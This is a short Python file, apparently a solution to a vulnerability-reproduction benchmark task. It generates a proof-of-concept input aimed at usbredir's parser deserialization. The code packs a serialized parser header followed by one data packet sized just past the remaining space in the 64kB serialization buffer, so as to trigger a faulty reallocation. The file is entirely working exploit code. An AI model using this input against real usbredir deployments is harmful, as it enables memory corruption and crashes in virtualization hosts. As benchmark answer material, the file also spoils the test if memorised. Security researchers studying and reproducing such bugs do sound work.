import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Constants based on usbredir source code analysis
        USB_REDIR_PARSER_MAGIC = 0x50425355  # "USBP"
        USB_REDIR_PARSER_VERSION = 1
        USB_REDIR_DATA_PACKET = 3
        USBREDIRPARSER_SERIALIZE_BUF_SIZE = 64 * 1024
        SIZEOF_EP_INFO_ARRAY = 256

        poc_parts = []

        # Construct the header and parser state part of the serialized data.
        # This structure must match what `usbredirparser_deserialize` expects.
        poc_parts.append(struct.pack('<II', USB_REDIR_PARSER_MAGIC, USB_REDIR_PARSER_VERSION))
        poc_parts.append(struct.pack('<Q', 0))  # id
        poc_parts.append(struct.pack('<i', 0))  # type
        poc_parts.append(b'\x00' * SIZEOF_EP_INFO_ARRAY)  # ep_info_in
        poc_parts.append(b'\x00' * SIZEOF_EP_INFO_ARRAY)  # ep_info_out
        poc_parts.append(struct.pack('<I', 0))  # buffered_bulk_packet_count

        # The size of the state written before the write buffers.
        # This determines the initial offset within the serialization buffer.
        state_header_size = sum(len(p) for p in poc_parts)

        # During serialization, 4 bytes are reserved for the write buffer count.
        # This advances the internal pointer.
        offset_before_packets = state_header_size + 4

        # Calculate remaining space in the default 64kB serialization buffer.
        remaining_space = USBREDIRPARSER_SERIALIZE_BUF_SIZE - offset_before_packets

        # To trigger the realloc, the next serialized item (a packet) must
        # be larger than the remaining space. A packet consists of an 8-byte
        # header and its data.
        # We need: 8 + packet_data_len > remaining_space
        # The smallest integer length that satisfies this is:
        # packet_data_len = remaining_space - 8 + 1 = remaining_space - 7
        packet_data_len = remaining_space - 7
        
        # A single large packet is sufficient and creates a minimal PoC.
        num_packets = 1

        # Add the number of write buffers to our PoC.
        poc_parts.append(struct.pack('<I', num_packets))
        
        # Add the single large write buffer itself.
        packet_header = struct.pack('<II', USB_REDIR_DATA_PACKET, packet_data_len)
        packet_data = b'\x41' * packet_data_len
        poc_parts.append(packet_header + packet_data)
        
        return b''.join(poc_parts)